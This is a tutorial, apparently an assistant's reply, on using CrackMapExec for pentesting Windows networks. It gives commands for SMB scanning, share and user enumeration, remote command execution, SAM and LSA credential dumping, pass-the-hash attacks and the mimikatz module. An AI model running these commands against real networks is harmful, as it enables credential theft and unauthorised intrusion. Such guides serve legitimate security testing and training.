# crackmapexec

## Step 1: Installation

First, ensure you have Python 3.6+ installed on your machine. You can install CrackMapExec using pip:

```bash
pip install crackmapexec
```

Alternatively, you can install it from the source:

```bash
git clone https://github.com/byt3bl33d3r/CrackMapExec
cd CrackMapExec
python setup.py install
```

### Step 2: Basic Usage

#### 2.1. Scanning a Network

To scan a network and identify live hosts:

```bash
cme smb 192.168.1.0/24
```

This command will scan the specified subnet (192.168.1.0/24) and list all hosts that have SMB (Server Message Block) enabled.

#### 2.2. Enumerating Shares

To enumerate shared folders on a specific host:

```bash
cme smb 192.168.1.10 -u username -p password --shares
```

Replace `username` and `password` with valid credentials. This command will list all shared folders on the host 192.168.1.10.

### Step 3: Authentication Methods

#### 3.1. Using Username and Password

You can provide a username and password for authentication:

```bash
cme smb 192.168.1.10 -u username -p password
```

#### 3.2. Using NTLM Hash

If you have the NTLM hash of a user’s password, you can authenticate using the hash:

```bash
cme smb 192.168.1.10 -u username -H ntlm_hash
```

#### 3.3. Using a Credential File

You can also use a file containing credentials:

```bash
cme smb 192.168.1.10 -C credentials.txt
```

The `credentials.txt` file should have credentials in the format:

```
username:password
username:ntlm_hash
```

### Step 4: Executing Commands

#### 4.1. Remote Command Execution

To execute a command on a remote host:

```bash
cme smb 192.168.1.10 -u username -p password -x "ipconfig /all"
```

This will run the `ipconfig /all` command on the remote host and display the output.

#### 4.2. PowerShell Commands

To execute a PowerShell command:

```bash
cme smb 192.168.1.10 -u username -p password -X "Get-Process"
```

### Step 5: Enumerating Users and Groups

#### 5.1. Enumerating Domain Users

To list all users in the domain:

```bash
cme smb 192.168.1.10 -u username -p password --users
```

#### 5.2. Enumerating Domain Groups

To list all groups in the domain:

```bash
cme smb 192.168.1.10 -u username -p password --groups
```

### Step 6: Credential Dumping

#### 6.1. Dumping SAM Database

To dump the SAM database from a remote host:

```bash
cme smb 192.168.1.10 -u username -p password --sam
```

#### 6.2. Dumping LSA Secrets

To dump LSA secrets:

```bash
cme smb 192.168.1.10 -u username -p password --lsa
```

### Step 7: Pass-the-Hash Attacks

To perform a pass-the-hash attack using an NTLM hash:

```bash
cme smb 192.168.1.10 -u username -H ntlm_hash --exec-method smbexec -x "ipconfig /all"
```

### Step 8: Advanced Usage

#### 8.1. Custom Modules

CrackMapExec supports custom modules that can extend its functionality. For example, to use the mimikatz module:

```bash
cme smb 192.168.1.10 -u username -p password -M mimikatz
```

#### 8.2. Config Files

You can use a configuration file to store your options and credentials:

```bash
cme smb 192.168.1.10 -c config.yaml
```

## Conclusion

CrackMapExec is a powerful tool for penetration testers and security professionals, allowing for a wide range of operations on Windows networks. The commands provided above are just a starting point; CME has many more features and options that can be explored in its [official documentation](https://github.com/byt3bl33d3r/CrackMapExec/wiki).

Feel free to ask if you have any specific scenarios or need further examples!